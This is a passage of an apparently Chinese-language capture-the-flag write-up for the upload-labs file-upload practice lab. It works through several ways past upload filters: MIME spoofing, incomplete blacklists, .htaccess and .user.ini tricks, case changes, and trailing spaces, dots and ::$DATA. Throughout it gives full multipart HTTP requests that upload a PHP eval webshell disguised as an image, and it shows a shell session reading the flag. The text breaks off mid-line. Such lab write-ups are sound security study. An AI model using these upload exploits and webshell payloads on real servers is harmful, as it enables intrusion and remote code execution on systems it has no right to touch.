class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(*) 基础信息</span><br><span class="line">当前路径: /var/www/html/upload</span><br><span class="line">磁盘列表: /</span><br><span class="line">系统信息: Linux out 4.19.221-0419221-generic <span class="comment">#202112141049 SMP Tue Dec 14 11:54:51 UTC 2021 x86_64</span></span><br><span class="line">当前用户: www-data</span><br><span class="line">(*) 输入 ashelp 查看本地命令</span><br><span class="line">(www-data:/var/www/html/upload) $ <span class="built_in">cd</span> /</span><br><span class="line">(www-data:/) $ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">init-scripts</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">(www-data:/) $ <span class="built_in">cat</span> flag</span><br><span class="line">flag&#123;2e4c9e92-0a87-448f-816b-7dd80815b03e&#125;</span><br><span class="line">(www-data:/) $</span><br></pre></td></tr></table></figure><h2 id="Pass-02-MIME绕过"><a href="#Pass-02-MIME绕过" class="headerlink" title="Pass-02(MIME绕过)"></a>Pass-02(MIME绕过)</h2><p>此题为mime绕过,由于第一题我们也将mime更改了所以与第一题poc相同</p><h2 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03(黑名单绕过)"></a>Pass-03(黑名单绕过)</h2><p>这关为黑名单验证,但是黑名单并不全</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里可以使用.phtml等绕过</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220135850240.png" alt="image-20240220135850240"></p><h2 id="Pass-04-htaccess绕过黑名单"><a href="#Pass-04-htaccess绕过黑名单" class="headerlink" title="Pass-04(.htaccess绕过黑名单)"></a>Pass-04(.htaccess绕过黑名单)</h2><p>仍然是黑名单,但是增加了不少php的后缀,不过可以可以上传.htaccess来绕过</p><p>.htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line"></span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-04/index.php?action=show_code</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>380</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryAlCaT8MY9dXGKBFo</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81/Pass-04/index.php?action=show_code</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryAlCaT8MY9dXGKBFo</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload_file&quot;; filename=&quot;.htaccess&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/octet-stream</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;FilesMatch &quot;png&quot;&gt;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">  SetHandler application/x-httpd-php</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;/FilesMatch&gt;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryAlCaT8MY9dXGKBFo</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">上传</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryAlCaT8MY9dXGKBFo--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-04/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>313</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarycJmFOOAI4Dq9bwue</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://65f72dbb-0bd7-46a7-ac1b-e65b3f2519c4.node5.buuoj.cn:81/Pass-04/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarycJmFOOAI4Dq9bwue</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.png&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarycJmFOOAI4Dq9bwue</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">上传</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarycJmFOOAI4Dq9bwue--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220141436068.png" alt="image-20240220141436068"></p><h2 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05(大小写绕过)"></a>Pass-05(大小写绕过)</h2><p>又禁了.htaccess</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure><p>虽然没有禁.php7但是这里上传.php7并不能被解析</p><p>查看源码与前几关对比 发现这里并没有下面这行 将文件后缀名统一转换为小写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure><p>所以我们可以上传.phP来绕过</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220142700111.png" alt="image-20240220142700111"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220142713513.png" alt="image-20240220142713513"></p><h2 id="buu-upload-labs-windows-Pass-05-user-ini绕过"><a href="#buu-upload-labs-windows-Pass-05-user-ini绕过" class="headerlink" title="(buu upload-labs windows)Pass-05(.user.ini绕过)"></a>(buu upload-labs windows)Pass-05(.user.ini绕过)</h2><p>这关在BUU upload-labs windows中,禁了.htaccess</p><p>但在upload&#x2F;下存在一个readme.php, 并且没有禁.user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220145259013.png" alt="image-20240220145259013"></p><p>因此可以构造.user.ini来使readme.php包含我们上传的恶意文件</p><blockquote><p> php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。 </p><p><strong>实例</strong></p><p>php 配置项中有两个配置可以起到一些作用</p><blockquote><p>auto_prepend_file &#x3D; <filename>     &#x2F;&#x2F;包含在文件头<br>auto_append_file &#x3D; <filename>      &#x2F;&#x2F;包含在文件尾</p></blockquote><p>.user.ini</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// .user.ini</span><br><span class="line">auto_prepend_file = 1.jpg</span><br></pre></td></tr></table></figure><p>1.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 1.jpg</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure></blockquote><p>这里buu的window upload-labs靶机似乎有点问题,所以我就在本地window环境搭建了一个靶机进行测试</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-05/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>upload-labs</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>332</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://upload-labs</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary04B3H7j2HCxrhZa6</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://upload-labs/Pass-05/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary04B3H7j2HCxrhZa6</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload_file&quot;; filename=&quot;.user.ini&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/octet-stream</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">auto_prepend_file = shell.jpg</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary04B3H7j2HCxrhZa6</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">上传</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundary04B3H7j2HCxrhZa6--</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Pass-05/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>upload-labs</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>311</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://upload-labs</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryB0UdjI6DB38pICSw</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://upload-labs/Pass-05/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryB0UdjI6DB38pICSw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.jpg&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryB0UdjI6DB38pICSw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">上传</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryB0UdjI6DB38pICSw--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure><p>上传之后需要稍微等几分钟,等待user.ini生效</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220152813484.png" alt="image-20240220152813484"></p><p>这里就成功了</p><h2 id="Pass-06-末尾添加空格绕过"><a href="#Pass-06-末尾添加空格绕过" class="headerlink" title="Pass-06(末尾添加空格绕过)"></a>Pass-06(末尾添加空格绕过)</h2><p>这关需要在windows下进行, 对应了对应 buu upload-labs windows中的Pass-07</p><p>与之前对比这里少了首尾去除空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>需要注意的是在linux平台下能上传.php(空格)但是不能解析</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220144032092.png" alt="image-20240220144032092"></p><p>而在window下上传.php(空格)后,系统会自动删掉末尾的空格</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220160008012.png" alt="image-20240220160008012"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220160035462.png" alt="image-20240220160035462"></p><h2 id="Pass-07-末尾添加-绕过"><a href="#Pass-07-末尾添加-绕过" class="headerlink" title="Pass-07(末尾添加.绕过)"></a>Pass-07(末尾添加.绕过)</h2><p>没有删除末尾的点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220154319631.png" alt="image-20240220154319631"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220154354916.png" alt="image-20240220154354916"></p><h2 id="Pass-08-末尾添加-DATA绕过"><a href="#Pass-08-末尾添加-DATA绕过" class="headerlink" title="Pass-08(末尾添加::$DATA绕过)"></a>Pass-08(末尾添加::$DATA绕过)</h2><p>缺少了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span 